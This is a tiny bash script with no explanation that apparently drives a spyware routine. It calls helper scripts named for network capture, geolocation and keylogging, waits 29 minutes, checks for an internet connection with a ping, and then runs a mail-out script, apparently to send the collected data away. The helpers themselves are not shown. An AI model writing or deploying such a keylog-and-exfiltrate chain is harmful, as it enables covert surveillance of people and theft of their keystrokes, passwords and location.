#!/bin/bash
network.sh; wc.sh; geolocation.py; keylog.py; sleep 29m && ping -c 1 google.com > /dev/null
STATUS=$?
if [[ $STATUS == 0 ]]; then mailout.sh; fi
